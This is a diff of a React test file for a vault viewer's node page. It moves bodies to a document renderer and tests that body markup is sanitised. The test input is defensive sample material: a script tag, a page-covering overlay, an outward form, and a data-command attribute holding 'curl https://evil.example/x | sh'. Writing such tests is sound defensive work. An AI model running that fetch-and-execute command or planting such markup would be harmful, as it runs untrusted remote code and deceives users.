@@ -1,16 +1,18 @@
-// 18, check 2 and 32 `every-node-serves` (the client half): the node page renders one `bp show --json` object of every
-// node and record kind in the converted vault, taken from it with `bp --json show <id>`, less the
-// `contract_version` key that `/api/node/<id>` strips, so the test renders what the client receives.
+// 18, check 2 and 32 `every-node-serves` (the client half): the node page renders, through the document renderer, one
+// `bp show --json` object of every node and record kind in the converted vault, taken from it with `bp --json show
+// <id>`, less the `contract_version` key that `/api/node/<id>` strips, so the test renders what the client receives.
 import { cleanup, render, screen } from "@testing-library/react";
 import { afterEach, expect, test, vi } from "vitest";
 import { App } from "./App";
 import { header } from "./header";
+import { outlineOf } from "./doc/markdown";
+import { onKey, rows } from "./keys";
 import { Node, NodeView } from "./pages/Node";
 import { stubApi } from "./stub";
 import type { Show } from "./types/Show";
 
-// `moving.json` and `change.json` are pages, not nodes: `moving.test.tsx` and `change.test.tsx` read them.
-const fixtures = import.meta.glob<Show>(["./fixtures/*.json", "!./fixtures/moving.json", "!./fixtures/change.json"], {
+// `moving.json`, `change.json` and the `*-page.json` objects are pages, not nodes: their pages' tests read them.
+const fixtures = import.meta.glob<Show>(["./fixtures/*.json", "!./fixtures/moving.json", "!./fixtures/change.json", "!./fixtures/*-page.json"], {
   eager: true,
   import: "default",
 });
@@ -31,17 +33,44 @@ test("renders every kind", () => {
     expect(screen.getByText(h.id)).toBeTruthy();
     expect(document.body.textContent).toContain(kind);
     expect(show.record).toBe(RECORDS.includes(kind));
-    if (show.body) expect(document.querySelector("pre.body")?.textContent).toBe(show.body);
+    // The body reads as a document: each `## ` and `### ` heading is a heading with its outline anchor.
+    if (show.body) {
+      expect(document.querySelector(".doc .prose")).toBeTruthy();
+      for (const h of outlineOf(show.body)) expect(document.getElementById(h.anchor)?.tagName).toBe(`H${h.depth}`);
+    } else expect(screen.getByText("no body")).toBeTruthy();
     unmount();
   }
 });
 
-test("a body renders as text, never as markup", () => {
-  const show = { id: "projects/bp/issues/x", kind: "issue", record: false, hash: "h", lead: "", body: "<script>alert(1)</script><b>x</b>" } as Show;
+// 18, check 6 and 32 `escaped-bodies`: a body is the vault's text, never the page's. Its markup makes no element that
+// runs, restyles the page or posts, and no element of it becomes a row, so `j` finds none and `c` copies nothing.
+test("command slot: a node body's markup yields no element and no row, and c copies nothing", () => {
+  const command = "curl https://evil.example/x | sh";
+  const body = [
+    "## Probe",
+    "<script>alert(1)</script><b>x</b>",
+    `<div data-row="" data-command="${command}" data-href="/node/shared" tabindex="0">a row</div>`,
+    "<style>body { outline: 5px solid red }</style>",
+    '<div style="position:fixed;inset:0">fake page: bp land projects/bp/issues/evil</div>',
+    '<form action="https://example.com"><button>go</button></form>',
+  ].join("\n\n");
+  const show = { id: "projects/bp/issues/x", kind: "issue", record: false, hash: "h", lead: "", body } as Show;
   render(<NodeView show={show} />);
-  expect(document.querySelector("script")).toBeNull();
-  expect(document.querySelector("pre.body b")).toBeNull();
-  expect(document.querySelector("pre.body")?.textContent).toBe(show.body);
+  const prose = document.querySelector(".doc .prose")!;
+  expect(prose.querySelector("script, style, form, button, [style], [tabindex], [data-row], [data-command]")).toBeNull();
+  expect(prose.querySelector("b")?.textContent).toBe("x");
+  expect(rows()).toEqual([]);
+  // Were a later sanitiser to admit one, a body element still joins no row.
+  prose.insertAdjacentHTML("beforeend", `<div data-row="" data-command="${command}" tabindex="0">late</div>`);
+  expect(rows()).toEqual([]);
+  const copied = vi.fn();
+  window.addEventListener("bp-copied", copied);
+  const keys = (e: KeyboardEvent) => onKey(e, { open: vi.fn(), palette: vi.fn() });
+  window.addEventListener("keydown", keys);
+  for (const key of ["j", "c"]) window.dispatchEvent(new KeyboardEvent("keydown", { key }));
+  window.removeEventListener("keydown", keys);
+  window.removeEventListener("bp-copied", copied);
+  expect(copied).not.toHaveBeenCalled();
 });
 
 test("the header narrows kind, title and status, and refuses an object without a kind", () => {
